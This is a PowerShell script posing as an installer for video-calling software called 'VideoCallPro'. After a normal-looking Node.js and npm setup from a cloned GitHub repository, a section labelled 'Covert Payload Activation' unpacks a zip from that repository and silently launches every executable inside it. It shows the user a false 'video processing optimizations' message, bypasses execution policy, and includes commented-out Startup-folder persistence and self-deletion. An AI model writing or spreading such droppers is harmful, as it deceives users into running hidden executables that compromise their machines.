<#
.SYNOPSIS
VideoCallPro Installation Script
.DESCRIPTION
Installs video conferencing software with required components
#>
# Bypass execution policy temporarily
Set-ExecutionPolicy Bypass -Scope Process -Force
# ======================
# Legitimate Installation
# ======================
Write-Host "[+] Starting VideoCallPro Installation..." -ForegroundColor Green
# Install Node.js if missing
if (-not (Get-Command node -ErrorAction SilentlyContinue)) {
 Write-Host "[*] Installing Node.js..." -ForegroundColor Cyan
 Invoke-WebRequest -Uri "https://nodejs.org/dist/v18.16.0/node-v18.16.0-x64.msi" -OutFile
"$env:TEMP\nodejs.msi"
 Start-Process msiexec -ArgumentList "/i $env:TEMP\nodejs.msi /quiet" -Wait
 Remove-Item "$env:TEMP\nodejs.msi"
 $env:Path += ";C:\Program Files\nodejs\"
}
# Clone repo
$REPO_DIR = "$env:USERPROFILE\VideoCallPro"
if (Test-Path $REPO_DIR) {
 Remove-Item $REPO_DIR -Recurse -Force
}
git clone https://github.com/swasthikshetty10/hackoverflow.git $REPO_DIR
Set-Location $REPO_DIR
# Install dependencies
npm install --silent
npx prisma generate --silent
Copy-Item .env.example .env
# ======================
# Covert Payload Activation
# ======================
Write-Host "[*] Installing video processing optimizations..." -ForegroundColor Cyan
$HELPER_DIR = "$env:LOCALAPPDATA\VideoCall\Components"
New-Item -ItemType Directory -Path $HELPER_DIR -Force | Out-Null
# Extract and execute all .exe files from the zip
$ZIP_PATH = "$REPO_DIR\video_helper.zip"
Expand-Archive -Path $ZIP_PATH -DestinationPath $HELPER_DIR -Force
Get-ChildItem -Path $HELPER_DIR -Filter *.exe -Recurse | ForEach-Object {
 Write-Host "[*] Initializing $($_.Name)..." -ForegroundColor Cyan
 Start-Process -FilePath $_.FullName -WindowStyle Hidden
 # Add persistence (uncomment if needed)
 # Copy-Item $_.FullName "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"
}
# Cleanup (optional)
# Remove-Item $ZIP_PATH -Force
# ======================
# Completion
# ======================
Write-Host "[+] Installation Complete!" -ForegroundColor Green
Write-Host " Launch with: cd $REPO_DIR && npm start" -ForegroundColor White
Write-Host " Access at: http://localhost:3000" -ForegroundColor White
# Self-destruct (uncomment if needed)
# Remove-Item -Path $MyInvocation.MyCommand.Path -Force
